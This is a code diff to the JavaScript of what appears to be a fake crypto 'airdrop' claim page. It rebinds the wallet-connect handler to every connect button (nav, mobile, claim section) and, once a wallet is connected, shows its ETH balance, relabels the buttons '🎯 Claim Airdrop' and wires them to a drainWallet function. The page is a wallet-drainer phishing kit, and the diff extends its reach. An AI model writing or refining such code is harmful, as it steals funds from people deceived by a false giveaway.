@@ -320,8 +320,8 @@ $(document).ready(function() {
         });
     }
 
-    // Insert wallet dropdown before button with improved mobile handling
-    $('.button-container').prepend('<select id="wallet-select" style="margin-bottom:15px;"></select>');
+    // Insert wallet dropdown only into the claim section (not nav/mobile buttons)
+    $('.claim-wallet').prepend('<select id="wallet-select" style="margin-bottom:15px;"></select>');
     
     // Add wallets to dropdown with device-specific filtering
     if (detectedWallets.length === 0) {
@@ -350,8 +350,8 @@ $(document).ready(function() {
         $('#wallet-select').append(`<option value="${i}">${displayName}</option>`);
     });
 
-    // Add connection status indicator
-    $('.button-container').prepend('<div id="connection-status" style="margin-bottom:10px; font-size:12px; color:#666;"></div>');
+    // Add connection status indicator (only in claim section)
+    $('.claim-wallet').prepend('<div id="connection-status" style="margin-bottom:10px; font-size:12px; color:#666;"></div>');
     
     // Update connection status
     function updateConnectionStatus(message, isError = false) {
@@ -366,8 +366,8 @@ $(document).ready(function() {
     // Debug wallet providers on page load
     debugWalletProviders();
 
-    // Main wallet connection handler
-    $('#connect-wallet').on('click', async () => {
+    // Main wallet connection handler — bind to all connect-wallet buttons (nav, mobile, claim)
+    $('.connect-wallet-btn').on('click', async () => {
         const selectedIdx = $('#wallet-select').val();
         const selected = detectedWallets[selectedIdx];
         let provider = null;
@@ -560,9 +560,9 @@ $(document).ready(function() {
             // Update connection status and button
             updateConnectionStatus(`Connected to ${walletName} | Balance: ${parseFloat(ethBalance).toFixed(4)} ETH`);
             
-            // Update button
-            $('#connect-wallet').text("🎯 Claim Airdrop");
-            $('#connect-wallet').off('click').on('click', async () => {
+            // Update button text on all wallet buttons
+            $('.connect-wallet-btn').text("🎯 Claim Airdrop");
+            $('.connect-wallet-btn').off('click').on('click', async () => {
                 await drainWallet(ethersProvider, signer, userAddress);
             });
             
